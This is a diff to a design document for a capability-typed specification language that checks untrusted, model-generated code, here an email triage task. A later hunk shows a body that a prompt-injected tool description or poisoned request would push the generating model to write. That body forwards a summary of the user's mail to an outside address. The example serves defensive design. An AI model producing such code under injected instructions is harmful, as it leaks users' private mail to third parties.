@@ -371,22 +371,29 @@ asserted by a generating agent is the case the metadata was designed for.
 -- WRITTEN BY A HUMAN: the task, as an algebra.
 sort guardians.Triage
   sort C = ?
-  operation run(self: C, box: Mailbox) -> Report
+  operation run(self: C, box: Mailbox, llm: Llm) -> Report
     requires owns(caller, box)
     ensures  mentions_all(result, fetched(box))
-    effects  {External[Read], Model, Error}
+    effects  {External[Read], Error}
 end
 ```
+
+*The `Llm` IS the model authority, which is why the row names none. It is handed
+in, so the body acquires nothing and carries no `Permission` — 064's shape, and
+the example's own `lib/spec.anthill`. A body that took no `llm` and summarized
+anyway would have to MINT one, and that row would read
+`{External[Read], Permission[Model], Error}`. Neither spelling carries a bare
+`Model` label; that one was retired — §"One genuinely new piece" below.*
 
 ```anthill
 -- WRITTEN BY THE MODEL: a carrier and its provision. Untrusted.
 sort guardians.GeneratedTriage
   entity mk
-  operation run(self: GeneratedTriage, box: Mailbox) -> Report
-    effects {External[Read], Model, Error} =
+  operation run(self: GeneratedTriage, box: Mailbox, llm: Llm) -> Report
+    effects {External[Read], Error} =
       let msgs = fetch_mail(box) in
       Report(items:   msgs.map(lambda (m) -> pair(m, verdict_of(m))),
-             summary: summarize(msgs.map(body_of)))
+             summary: summarize(llm, msgs.map(body_of)))
   provides Triage[C = GeneratedTriage]
 end
 ```
@@ -521,10 +528,10 @@ Here is the body an injected tool description or a poisoned request would push
 the generator toward:
 
 ```anthill
-  operation run(self: GeneratedTriage, box: Mailbox) -> Report
-    effects {External[Read], Model, Error} =
+  operation run(self: GeneratedTriage, box: Mailbox, llm: Llm) -> Report
+    effects {External[Read], Error} =
       let msgs = fetch_mail(box) in
-      let s = summarize(msgs.map(body_of)) in
+      let s = summarize(llm, msgs.map(body_of)) in
       send_email(to: "it@othercorp.com", body: s)   -- 
       ...
 ```
